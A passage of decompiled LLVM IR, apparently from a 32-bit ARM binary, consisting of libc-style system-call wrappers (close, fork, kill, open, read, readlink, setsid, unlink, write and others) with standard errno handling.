  %v0_b868 = call i32 @function_bdd4()
  %v0_b86c = load i32, i32* %r4.global-to-local, align 4
  %v1_b86c = sub i32 0, %v0_b86c
  %v2_b870 = inttoptr i32 %v0_b868 to i32*
  store i32 %v1_b86c, i32* %v2_b870, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b878

dec_label_pc_b878:                                ; preds = %dec_label_pc_b854, %dec_label_pc_b868
  %v0_b878 = phi i32 [ %v3_b858, %dec_label_pc_b854 ], [ -1, %dec_label_pc_b868 ]
  %v2_b87c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b87c, i32* @r4, align 4
  ret i32 %v0_b878

; uselistorder directives
  uselistorder i32 %v3_b858, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b878, { 1, 0 }
}

define i32 @function_b880(i32 %arg1) local_unnamed_addr {
dec_label_pc_b880:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b880 = load i32, i32* @r4, align 4
  store i32 %v3_b880, i32* %stack_var_-8, align 4
  %v1_b884 = call i32 @close(i32 %arg1)
  store i32 %v1_b884, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_b884, -4095
  br i1 %tmp, label %dec_label_pc_b8a4, label %dec_label_pc_b894

dec_label_pc_b894:                                ; preds = %dec_label_pc_b880
  %v0_b894 = call i32 @function_bdd4()
  %v0_b898 = load i32, i32* %r4.global-to-local, align 4
  %v1_b898 = sub i32 0, %v0_b898
  %v2_b89c = inttoptr i32 %v0_b894 to i32*
  store i32 %v1_b898, i32* %v2_b89c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b8a4

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b894
  %v0_b8a4 = phi i32 [ %v1_b884, %dec_label_pc_b880 ], [ -1, %dec_label_pc_b894 ]
  %v2_b8a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b8a8, i32* @r4, align 4
  ret i32 %v0_b8a4

; uselistorder directives
  uselistorder i32 %v1_b884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b8a4, { 1, 0 }
}

define i32 @function_b8ac() local_unnamed_addr {
dec_label_pc_b8ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b8ac = load i32, i32* @r4, align 4
  store i32 %v3_b8ac, i32* %stack_var_-8, align 4
  %v0_b8b0 = call i32 @fork()
  store i32 %v0_b8b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b8b0, -4095
  br i1 %tmp, label %dec_label_pc_b8d0, label %dec_label_pc_b8c0

dec_label_pc_b8c0:                                ; preds = %dec_label_pc_b8ac
  %v0_b8c0 = call i32 @function_bdd4()
  %v0_b8c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b8c4 = sub i32 0, %v0_b8c4
  %v2_b8c8 = inttoptr i32 %v0_b8c0 to i32*
  store i32 %v1_b8c4, i32* %v2_b8c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b8d0

dec_label_pc_b8d0:                                ; preds = %dec_label_pc_b8ac, %dec_label_pc_b8c0
  %v0_b8d0 = phi i32 [ %v0_b8b0, %dec_label_pc_b8ac ], [ -1, %dec_label_pc_b8c0 ]
  %v2_b8d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b8d4, i32* @r4, align 4
  ret i32 %v0_b8d0

; uselistorder directives
  uselistorder i32 %v0_b8b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b8d0, { 1, 0 }
}

define i32 @function_b8d8() local_unnamed_addr {
dec_label_pc_b8d8:
  %stack_var_-12 = alloca i32, align 4
  %v2_b8dc = ptrtoint i32* %stack_var_-12 to i32
  %v2_b8e8 = call i32 @function_b958(i32 7, i32 %v2_b8dc)
  %v1_b8ec = icmp slt i32 %v2_b8e8, 0
  br i1 %v1_b8ec, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_b8d8
  %v5_b8f4 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_b8d8, %bb
  %v5_b8fc = phi i32 [ 256, %dec_label_pc_b8d8 ], [ %v5_b8f4, %bb ]
  ret i32 %v5_b8fc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_b900() local_unnamed_addr {
dec_label_pc_b900:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b900 = load i32, i32* @r4, align 4
  store i32 %v3_b900, i32* %stack_var_-8, align 4
  %v0_b904 = call i32 @getpid()
  store i32 %v0_b904, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b904, -4095
  br i1 %tmp, label %dec_label_pc_b924, label %dec_label_pc_b914

dec_label_pc_b914:                                ; preds = %dec_label_pc_b900
  %v0_b914 = call i32 @function_bdd4()
  %v0_b918 = load i32, i32* %r4.global-to-local, align 4
  %v1_b918 = sub i32 0, %v0_b918
  %v2_b91c = inttoptr i32 %v0_b914 to i32*
  store i32 %v1_b918, i32* %v2_b91c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b924

dec_label_pc_b924:                                ; preds = %dec_label_pc_b900, %dec_label_pc_b914
  %v0_b924 = phi i32 [ %v0_b904, %dec_label_pc_b900 ], [ -1, %dec_label_pc_b914 ]
  %v2_b928 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b928, i32* @r4, align 4
  ret i32 %v0_b924

; uselistorder directives
  uselistorder i32 %v0_b904, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b924, { 1, 0 }
}

define i32 @function_b92c() local_unnamed_addr {
dec_label_pc_b92c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b92c = load i32, i32* @r4, align 4
  store i32 %v3_b92c, i32* %stack_var_-8, align 4
  %v0_b930 = call i32 @getppid()
  store i32 %v0_b930, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b930, -4095
  br i1 %tmp, label %dec_label_pc_b950, label %dec_label_pc_b940

dec_label_pc_b940:                                ; preds = %dec_label_pc_b92c
  %v0_b940 = call i32 @function_bdd4()
  %v0_b944 = load i32, i32* %r4.global-to-local, align 4
  %v1_b944 = sub i32 0, %v0_b944
  %v2_b948 = inttoptr i32 %v0_b940 to i32*
  store i32 %v1_b944, i32* %v2_b948, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b950

dec_label_pc_b950:                                ; preds = %dec_label_pc_b92c, %dec_label_pc_b940
  %v0_b950 = phi i32 [ %v0_b930, %dec_label_pc_b92c ], [ -1, %dec_label_pc_b940 ]
  %v2_b954 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b954, i32* @r4, align 4
  ret i32 %v0_b950

; uselistorder directives
  uselistorder i32 %v0_b930, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b950, { 1, 0 }
}

define i32 @function_b958(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b958:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b958 = load i32, i32* @r4, align 4
  store i32 %v3_b958, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_b97c, label %dec_label_pc_b96c

dec_label_pc_b96c:                                ; preds = %dec_label_pc_b958
  %v0_b96c = call i32 @function_bdd4()
  %v0_b970 = load i32, i32* %r4.global-to-local, align 4
  %v1_b970 = sub i32 0, %v0_b970
  %v2_b974 = inttoptr i32 %v0_b96c to i32*
  store i32 %v1_b970, i32* %v2_b974, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_b980.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b958, %dec_label_pc_b96c
  %v2_b980 = phi i32 [ %v3_b958, %dec_label_pc_b958 ], [ %v2_b980.pre, %dec_label_pc_b96c ]
  %v0_b97c = phi i32 [ %arg1, %dec_label_pc_b958 ], [ -1, %dec_label_pc_b96c ]
  store i32 %v2_b980, i32* @r4, align 4
  ret i32 %v0_b97c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b97c, { 1, 0 }
}

define i32 @function_b984(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b984:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b984 = load i32, i32* @r4, align 4
  store i32 %v3_b984, i32* %stack_var_-8, align 4
  %v2_b988 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v7_b98c = icmp eq i32 %v2_b988, -4096
  store i1 %v7_b98c, i1* @cpsr_z, align 1
  store i32 %v2_b988, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_b988, -4095
  br i1 %tmp, label %dec_label_pc_b9a8, label %dec_label_pc_b998

dec_label_pc_b998:                                ; preds = %dec_label_pc_b984
  %v0_b998 = call i32 @function_bdd4()
  %v0_b99c = load i32, i32* %r4.global-to-local, align 4
  %v1_b99c = sub i32 0, %v0_b99c
  %v2_b9a0 = inttoptr i32 %v0_b998 to i32*
  store i32 %v1_b99c, i32* %v2_b9a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b9a8

dec_label_pc_b9a8:                                ; preds = %dec_label_pc_b984, %dec_label_pc_b998
  %v0_b9a8 = phi i32 [ %v2_b988, %dec_label_pc_b984 ], [ -1, %dec_label_pc_b998 ]
  %v2_b9ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b9ac, i32* @r4, align 4
  ret i32 %v0_b9a8

; uselistorder directives
  uselistorder i32 %v2_b988, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_b9a8, { 1, 0 }
}

define i32 @function_b9b0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b9b0:
  %r4.global-to-local = alloca i32, align 4
  %v1_b9c0 = and i32 %arg2, 64
  %v2_b9c0 = icmp eq i32 %v1_b9c0, 0
  br i1 %v2_b9c0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_b9b0
  %v6_b9b0 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_b9b0, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b9b0, %bb
  %v0_b9d0 = phi i32 [ 0, %dec_label_pc_b9b0 ], [ %phitmp, %bb ]
  store i32 %v0_b9d0, i32* @r2, align 4
  %v4_b9d8 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_b9dc = icmp eq i32 %v4_b9d8, -4096
  store i1 %v7_b9dc, i1* @cpsr_z, align 1
  store i32 %v4_b9d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_b9d8, -4095
  br i1 %tmp, label %dec_label_pc_b9f8, label %dec_label_pc_b9e8

dec_label_pc_b9e8:                                ; preds = %.thread1
  %v0_b9e8 = call i32 @function_bdd4()
  %v0_b9ec = load i32, i32* %r4.global-to-local, align 4
  %v1_b9ec = sub i32 0, %v0_b9ec
  %v2_b9f0 = inttoptr i32 %v0_b9e8 to i32*
  store i32 %v1_b9ec, i32* %v2_b9f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b9f8

dec_label_pc_b9f8:                                ; preds = %.thread1, %dec_label_pc_b9e8
  %v0_b9f8 = phi i32 [ %v4_b9d8, %.thread1 ], [ -1, %dec_label_pc_b9e8 ]
  ret i32 %v0_b9f8

; uselistorder directives
  uselistorder i32 %v4_b9d8, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_b9f8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_ba0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_ba0c:
  store i32 %arg1, i32* @r2, align 4
  %v0_ba14 = load i32, i32* @r0, align 4
  %v2_ba14 = inttoptr i32 %v0_ba14 to i8*
  %v3_ba14 = call i32 @function_b9b0(i8* %v2_ba14, i32 577)
  %v0_ba18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ba18, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_ba0c
  %v6_ba18 = and i32 %v3_ba14, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_ba0c, %bb
  %v7_ba18 = phi i32 [ %v3_ba14, %dec_label_pc_ba0c ], [ %v6_ba18, %bb ]
  ret i32 %v7_ba18

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_ba1c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ba1c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ba1c = load i32, i32* @r4, align 4
  store i32 %v3_ba1c, i32* %stack_var_-8, align 4
  %v4_ba20 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_ba20, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_ba20, -4095
  br i1 %tmp, label %dec_label_pc_ba40, label %dec_label_pc_ba30

dec_label_pc_ba30:                                ; preds = %dec_label_pc_ba1c
  %v0_ba30 = call i32 @function_bdd4()
  %v0_ba34 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba34 = sub i32 0, %v0_ba34
  %v2_ba38 = inttoptr i32 %v0_ba30 to i32*
  store i32 %v1_ba34, i32* %v2_ba38, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ba40

dec_label_pc_ba40:                                ; preds = %dec_label_pc_ba1c, %dec_label_pc_ba30
  %v0_ba40 = phi i32 [ %v4_ba20, %dec_label_pc_ba1c ], [ -1, %dec_label_pc_ba30 ]
  %v2_ba44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ba44, i32* @r4, align 4
  ret i32 %v0_ba40

; uselistorder directives
  uselistorder i32 %v4_ba20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ba40, { 1, 0 }
}

define i32 @function_ba48(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ba48:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v3_ba48 = load i32, i32* @r4, align 4
  store i32 %v3_ba48, i32* %stack_var_-8, align 4
  %v7_ba4c = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  store i32 %v7_ba4c, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v7_ba4c, -4095
  br i1 %tmp6, label %dec_label_pc_ba6c, label %dec_label_pc_ba5c

dec_label_pc_ba5c:                                ; preds = %dec_label_pc_ba48
  %v0_ba5c = call i32 @function_bdd4()
  %v0_ba60 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba60 = sub i32 0, %v0_ba60
  %v2_ba64 = inttoptr i32 %v0_ba5c to i32*
  store i32 %v1_ba60, i32* %v2_ba64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ba6c

dec_label_pc_ba6c:                                ; preds = %dec_label_pc_ba48, %dec_label_pc_ba5c
  %v0_ba6c = phi i32 [ %v7_ba4c, %dec_label_pc_ba48 ], [ -1, %dec_label_pc_ba5c ]
  %v2_ba70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ba70, i32* @r4, align 4
  ret i32 %v0_ba6c

; uselistorder directives
  uselistorder i32 %v7_ba4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ba6c, { 1, 0 }
}

define i32 @function_ba74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_ba74:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ba74 = load i32, i32* @r4, align 4
  store i32 %v3_ba74, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ba9c, label %dec_label_pc_ba8c

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba74
  %v0_ba8c = call i32 @function_bdd4()
  %v0_ba90 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba90 = sub i32 0, %v0_ba90
  %v2_ba94 = inttoptr i32 %v0_ba8c to i32*
  store i32 %v1_ba90, i32* %v2_ba94, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_baa0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ba9c

dec_label_pc_ba9c:                                ; preds = %dec_label_pc_ba74, %dec_label_pc_ba8c
  %v2_baa0 = phi i32 [ %v3_ba74, %dec_label_pc_ba74 ], [ %v2_baa0.pre, %dec_label_pc_ba8c ]
  %v0_ba9c = phi i32 [ %arg1, %dec_label_pc_ba74 ], [ -1, %dec_label_pc_ba8c ]
  store i32 %v2_baa0, i32* @r4, align 4
  ret i32 %v0_ba9c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ba9c, { 1, 0 }
}

define i32 @function_baa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_baa4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_baa4 = load i32, i32* @r4, align 4
  store i32 %v3_baa4, i32* %stack_var_-8, align 4
  %v0_baa8 = call i32 @setsid()
  store i32 %v0_baa8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_baa8, -4095
  br i1 %tmp, label %dec_label_pc_bac8, label %dec_label_pc_bab8

dec_label_pc_bab8:                                ; preds = %dec_label_pc_baa4
  %v0_bab8 = call i32 @function_bdd4()
  %v0_babc = load i32, i32* %r4.global-to-local, align 4
  %v1_babc = sub i32 0, %v0_babc
  %v2_bac0 = inttoptr i32 %v0_bab8 to i32*
  store i32 %v1_babc, i32* %v2_bac0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bac8

dec_label_pc_bac8:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_bab8
  %v0_bac8 = phi i32 [ %v0_baa8, %dec_label_pc_baa4 ], [ -1, %dec_label_pc_bab8 ]
  %v2_bacc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bacc, i32* @r4, align 4
  ret i32 %v0_bac8

; uselistorder directives
  uselistorder i32 %v0_baa8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bac8, { 1, 0 }
}

define i32 @function_bad0(i32* %arg1) local_unnamed_addr {
dec_label_pc_bad0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bad0 = load i32, i32* @r4, align 4
  store i32 %v3_bad0, i32* %stack_var_-8, align 4
  %v2_bad4 = call i32 @time(i32* %arg1)
  store i32 %v2_bad4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_bad4, -4095
  br i1 %tmp, label %dec_label_pc_baf4, label %dec_label_pc_bae4

dec_label_pc_bae4:                                ; preds = %dec_label_pc_bad0
  %v0_bae4 = call i32 @function_bdd4()
  %v0_bae8 = load i32, i32* %r4.global-to-local, align 4
  %v1_bae8 = sub i32 0, %v0_bae8
  %v2_baec = inttoptr i32 %v0_bae4 to i32*
  store i32 %v1_bae8, i32* %v2_baec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_baf4

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bad0, %dec_label_pc_bae4
  %v0_baf4 = phi i32 [ %v2_bad4, %dec_label_pc_bad0 ], [ -1, %dec_label_pc_bae4 ]
  %v2_baf8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_baf8, i32* @r4, align 4
  ret i32 %v0_baf4

; uselistorder directives
  uselistorder i32 %v2_bad4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_baf4, { 1, 0 }
}

define i32 @function_bafc(i8* %arg1) local_unnamed_addr {
dec_label_pc_bafc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bafc = load i32, i32* @r4, align 4
  store i32 %v3_bafc, i32* %stack_var_-8, align 4
  %v3_bb00 = call i32 @unlink(i8* %arg1)
  store i32 %v3_bb00, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_bb00, -4095
  br i1 %tmp, label %dec_label_pc_bb20, label %dec_label_pc_bb10

dec_label_pc_bb10:                                ; preds = %dec_label_pc_bafc
  %v0_bb10 = call i32 @function_bdd4()
  %v0_bb14 = load i32, i32* %r4.global-to-local, align 4
  %v1_bb14 = sub i32 0, %v0_bb14
  %v2_bb18 = inttoptr i32 %v0_bb10 to i32*
  store i32 %v1_bb14, i32* %v2_bb18, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bb20

dec_label_pc_bb20:                                ; preds = %dec_label_pc_bafc, %dec_label_pc_bb10
  %v0_bb20 = phi i32 [ %v3_bb00, %dec_label_pc_bafc ], [ -1, %dec_label_pc_bb10 ]
  %v2_bb24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bb24, i32* @r4, align 4
  ret i32 %v0_bb20

; uselistorder directives
  uselistorder i32 %v3_bb00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bb20, { 1, 0 }
}

define i32 @function_bb28(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bb28:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bb28 = load i32, i32* @r4, align 4
  store i32 %v3_bb28, i32* %stack_var_-8, align 4
  %v4_bb2c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_bb2c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_bb2c, -4095
  br i1 %tmp, label %dec_label_pc_bb4c, label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb28
  %v0_bb3c = call i32 @function_bdd4()
  %v0_bb40 = load i32, i32* %r4.global-to-local, align 4
  %v1_bb40 = sub i32 0, %v0_bb40
  %v2_bb44 = inttoptr i32 %v0_bb3c to i32*
  store i32 %v1_bb40, i32* %v2_bb44, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bb4c

dec_label_pc_bb4c:                                ; preds = %dec_label_pc_bb28, %dec_label_pc_bb3c
  %v0_bb4c = phi i32 [ %v4_bb2c, %dec_label_pc_bb28 ], [ -1, %dec_label_pc_bb3c ]
  %v2_bb50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bb50, i32* @r4, align 4
  ret i32 %v0_bb4c

; uselistorder directives
  uselistorder i32 %v4_bb2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bb4c, { 1, 0 }
}

define i32 @function_bb54(i32* %arg1) local_unnamed_addr {
dec_label_pc_bb54:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_bb54 = load i32, i32* @r4, align 4
  store i32 %v3_bb54, i32* %stack_var_-20, align 4
  %v6_bb54 = load i32, i32* @r5, align 4
  %v9_bb54 = load i32, i32* @r6, align 4
  %v12_bb54 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_bb5c = load i32, i32* %arg1, align 4
  store i32 %v2_bb5c, i32* %r4.global-to-local, align 4
  %v2_bb60 = ptrtoint i32* %stack_var_-36 to i32
  %v1_bb64 = add i32 %tmp, 24
  store i32 %v1_bb64, i32* @r6, align 4
  %v3_bb68 = icmp eq i32 %v2_bb5c, -1
  store i32 %v2_bb60, i32* @r7, align 4
  store i32 %v1_bb64, i32* %r2.global-to-local, align 4
  store i32 %v2_bb60, i32* @r0, align 4
  br i1 %v3_bb68, label %dec_label_pc_bb80, label %dec_label_pc_bb94

dec_label_pc_bb80:                                ; preds = %dec_label_pc_bb54
  %v0_bb80 = call i32 @function_bdd4()
  %v0_bb88 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bb88, i32* %r2.global-to-local, align 4
  %v2_bb8c = inttoptr i32 %v0_bb80 to i32*
  store i32 9, i32* %v2_bb8c, align 4
  %v0_bbec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bbec

dec_label_pc_bb94:                                ; preds = %dec_label_pc_bb54
  %v8_bb9c = call i32 @function_cdf4(i32 %v2_bb60, i32 ptrtoint (i32* @global_var_cdec.209 to i32), i32 %v1_bb64, i32 52724, i32 %v3_bb54, i32 %v6_bb54, i32 %v9_bb54)
  %v1_bbac = call i32 @function_cdec()
  %v0_bbb8 = load i32, i32* @r5, align 4
  %v1_bbb8 = inttoptr i32 %v0_bbb8 to i32*
  %v2_bbb8 = load i32, i32* %v1_bbb8, align 4
  store i32 %v2_bbb8, i32* @r4, align 4
  store i32 %v2_bb60, i32* @r0, align 4
  store i32 -1, i32* %v1_bbb8, align 4
  store i32 ptrtoint (i32* @global_var_bbd0.213 to i32), i32* @lr, align 4
  %v8_bbcc = call i32 @function_cdf4(i32 %v2_bb60, i32 1, i32 %v1_bb64, i32 52724, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_bbd0 = load i32, i32* @r5, align 4
  %v1_bbd0 = add i32 %v0_bbd0, 12
  %v2_bbd0 = inttoptr i32 %v1_bbd0 to i32*
  %v3_bbd0 = load i32, i32* %v2_bbd0, align 4
  %v1_bbd4 = call i32 @function_c3a4(i32 %v3_bbd0)
  %v0_bbd8 = load i32, i32* @r5, align 4
  %v1_bbdc = call i32 @function_c3a4(i32 %v0_bbd8)
  %v0_bbe0 = load i32, i32* @r4, align 4
  %v1_bbe4 = call i32 @function_b880(i32 %v0_bbe0)
  store i32 %v1_bbe4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bb80, %dec_label_pc_bb94
  %v0_bbec = phi i32 [ %v0_bbec.pre, %dec_label_pc_bb80 ], [ %v1_bbe4, %dec_label_pc_bb94 ]
  %v2_bbf4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_bbf4, i32* @r4, align 4
  store i32 %v6_bb54, i32* @r5, align 4
  store i32 %v9_bb54, i32* @r6, align 4
  store i32 %v12_bb54, i32* @r7, align 4
  ret i32 %v0_bbec

; uselistorder directives
  uselistorder i32 %v1_bb64, { 2, 1, 0, 3 }
  uselistorder i32 %v2_bb60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_bb54, { 1, 0 }
  uselistorder i32 %v6_bb54, { 1, 0 }
  uselistorder label %dec_label_pc_bbec, { 1, 0 }
}

define i32 @function_bc08(i32 %arg1) local_unnamed_addr {
dec_label_pc_bc08:
  %r5.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-108 = alloca i32, align 4
  %v3_bc08 = load i32, i32* @r4, align 4
  %v9_bc08 = load i32, i32* @r6, align 4
  %v12_bc08 = load i32, i32* @r7, align 4
  %v2_bc14 = inttoptr i32 %arg1 to i8*
  %v3_bc14 = call i32 @function_b9b0(i8* %v2_bc14, i32 18432)
  store i32 %v3_bc14, i32* @r0, align 4
  store i32 %v3_bc14, i32* @r7, align 4
  %v1_bc18 = icmp slt i32 %v3_bc14, 0
  br i1 %v1_bc18, label %.thread1, label %dec_label_pc_bc24

.thread1:                                         ; preds = %dec_label_pc_bc08
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_bcf4

dec_label_pc_bc24:                                ; preds = %dec_label_pc_bc08
  %v2_bc10 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_bc10, i32* @r1, align 4
  %v0_bc28 = call i32 @function_d244()
  %v1_bc2c = icmp slt i32 %v0_bc28, 0
  br i1 %v1_bc2c, label %dec_label_pc_bc4c, label %dec_label_pc_bc34

dec_label_pc_bc34:                                ; preds = %dec_label_pc_bc24
  %v0_bc34 = load i32, i32* @r7, align 4
  store i32 1, i32* @r2, align 4
  %v2_bc40 = call i32 @function_b790(i32 %v0_bc34, i32 2)
  %v1_bc44 = icmp slt i32 %v2_bc40, 0
  br i1 %v1_bc44, label %dec_label_pc_bc4c, label %dec_label_pc_bc6c

dec_label_pc_bc4c:                                ; preds = %dec_label_pc_bc34, %dec_label_pc_bc24
  %v0_bc4c = call i32 @function_bdd4()
  store i32 %v0_bc4c, i32* %r5.global-to-local, align 4
  %v0_bc54 = load i32, i32* @r7, align 4
  %v1_bc58 = inttoptr i32 %v0_bc4c to i32*
  %v2_bc58 = load i32, i32* %v1_bc58, align 4
  store i32 %v2_bc58, i32* @r4, align 4
  %v1_bc5c = call i32 @function_b880(i32 %v0_bc54)
  store i32 0, i32* @r6, align 4
  %v0_bc64 = load i32, i32* @r4, align 4
  %v1_bc64 = load i32, i32* %r5.global-to-local, align 4
  %v2_bc64 = inttoptr i32 %v1_bc64 to i32*
  store i32 %v0_bc64, i32* %v2_bc64, align 4
  br label %dec_label_pc_bcf4

dec_label_pc_bc6c:                                ; preds = %dec_label_pc_bc34
  %v1_bc70 = call i32 @function_c1f8(i32 48)
  store i32 %v1_bc70, i32* @r6, align 4
  %v2_bc74 = icmp eq i32 %v1_bc70, 0
